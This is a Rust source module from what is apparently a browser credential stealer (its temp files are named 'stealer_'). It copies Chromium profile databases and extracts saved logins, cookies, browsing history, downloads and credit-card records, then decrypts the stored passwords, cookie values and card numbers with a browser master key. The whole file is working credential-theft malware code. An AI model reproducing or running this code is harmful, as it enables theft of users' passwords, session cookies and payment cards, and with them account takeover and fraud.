use rusqlite::{Connection, OpenFlags, Result as SqlResult};
use std::{fs, path::PathBuf, process};

use super::crypto;
use super::types::*;

trait DatabaseExtractor<T> {
    fn db_path(&self, profile_path: &PathBuf) -> PathBuf;
    fn query(&self) -> &str;
    fn extract_row(&self, row: &rusqlite::Row) -> SqlResult<T>;
}

fn query_database<T, E: DatabaseExtractor<T>>(
    extractor: &E,
    profile_path: &PathBuf,
    processor: impl Fn(T) -> Option<T>,
) -> Vec<T> {
    let mut results = Vec::new();
    let db_path = extractor.db_path(profile_path);

    if !db_path.exists() {
        return results;
    }

    let temp_path = std::env::temp_dir().join(format!(
        "stealer_{}_{}.db",
        process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));

    if fs::copy(&db_path, &temp_path).is_err() {
        return results;
    }

    if let Ok(conn) = Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        if let Ok(mut stmt) = conn.prepare(extractor.query()) {
            if let Ok(rows) = stmt.query_map([], |row| extractor.extract_row(row)) {
                for row in rows.flatten() {
                    if let Some(processed) = processor(row) {
                        results.push(processed);
                    }
                }
            }
        }
    }

    let _ = fs::remove_file(temp_path);
    results
}

struct PasswordExtractor;
impl DatabaseExtractor<PasswordEntry> for PasswordExtractor {
    fn db_path(&self, profile_path: &PathBuf) -> PathBuf {
        profile_path.join("Login Data")
    }

    fn query(&self) -> &str {
        "SELECT action_url, username_value, password_value FROM logins"
    }

    fn extract_row(&self, row: &rusqlite::Row) -> SqlResult<PasswordEntry> {
        Ok(PasswordEntry {
            url: row.get(0)?,
            username: row.get(1)?,
            password: String::new(), // Será preenchido depois da descriptografia
            encrypted_password: row.get(2)?,
            browser: String::new(),
        })
    }
}

struct CookieExtractor;
impl DatabaseExtractor<CookieEntry> for CookieExtractor {
    fn db_path(&self, profile_path: &PathBuf) -> PathBuf {
        profile_path.join("Network").join("Cookies")
    }

    fn query(&self) -> &str {
        "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies"
    }

    fn extract_row(&self, row: &rusqlite::Row) -> SqlResult<CookieEntry> {
        Ok(CookieEntry {
            host: row.get(0)?,
            name: row.get(1)?,
            path: row.get(2)?,
            value: String::new(),
            encrypted_value: row.get(3)?,
            expires: row.get(4)?,
            browser: String::new(),
        })
    }
}

struct HistoryExtractor;
impl DatabaseExtractor<HistoryEntry> for HistoryExtractor {
    fn db_path(&self, profile_path: &PathBuf) -> PathBuf {
        profile_path.join("History")
    }

    fn query(&self) -> &str {
        "SELECT url, title, last_visit_time FROM urls"
    }

    fn extract_row(&self, row: &rusqlite::Row) -> SqlResult<HistoryEntry> {
        Ok(HistoryEntry {
            url: row.get(0)?,
            title: row.get(1)?,
            last_visit: row.get(2)?,
            browser: String::new(),
        })
    }
}

struct DownloadExtractor;
impl DatabaseExtractor<DownloadEntry> for DownloadExtractor {
    fn db_path(&self, profile_path: &PathBuf) -> PathBuf {
        profile_path.join("History")
    }

    fn query(&self) -> &str {
        "SELECT tab_url, target_path FROM downloads"
    }

    fn extract_row(&self, row: &rusqlite::Row) -> SqlResult<DownloadEntry> {
        Ok(DownloadEntry {
            url: row.get(0)?,
            path: row.get(1)?,
            browser: String::new(),
        })
    }
}

struct CardExtractor;
impl DatabaseExtractor<CardEntry> for CardExtractor {
    fn db_path(&self, profile_path: &PathBuf) -> PathBuf {
        profile_path.join("Web Data")
    }

    fn query(&self) -> &str {
        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards"
    }

    fn extract_row(&self, row: &rusqlite::Row) -> SqlResult<CardEntry> {
        Ok(CardEntry {
            name: row.get(0)?,
            expiration_month: row.get(1)?,
            expiration_year: row.get(2)?,
            card_number: String::new(),
            encrypted_card_number: row.get(3)?,
            date_modified: row.get(4)?,
            browser: String::new(),
        })
    }
}

pub fn get_passwords(
    browser_name: &str,
    profile_path: &PathBuf,
    master_key: &[u8],
) -> Vec<PasswordEntry> {
    query_database(&PasswordExtractor, profile_path, |mut entry| {
        crypto::decrypt_value(&entry.encrypted_password, master_key).map(|password| {
            entry.password = password;
            entry.browser = browser_name.to_string();
            entry
        })
    })
}

pub fn get_cookies(
    browser_name: &str,
    profile_path: &PathBuf,
    master_key: &[u8],
) -> Vec<CookieEntry> {
    query_database(&CookieExtractor, profile_path, |mut entry| {
        crypto::decrypt_value(&entry.encrypted_value, master_key).map(|value| {
            entry.value = value;
            entry.browser = browser_name.to_string();
            entry
        })
    })
}

pub fn get_history(browser_name: &str, profile_path: &PathBuf) -> Vec<HistoryEntry> {
    query_database(&HistoryExtractor, profile_path, |mut entry| {
        entry.browser = browser_name.to_string();
        Some(entry)
    })
}

pub fn get_downloads(browser_name: &str, profile_path: &PathBuf) -> Vec<DownloadEntry> {
    query_database(&DownloadExtractor, profile_path, |mut entry| {
        entry.browser = browser_name.to_string();
        Some(entry)
    })
}

pub fn get_cards(browser_name: &str, profile_path: &PathBuf, master_key: &[u8]) -> Vec<CardEntry> {
    query_database(&CardExtractor, profile_path, |mut entry| {
        crypto::decrypt_value(&entry.encrypted_card_number, master_key).map(|card_number| {
            entry.card_number = card_number;
            entry.browser = browser_name.to_string();
            entry
        })
    })
}
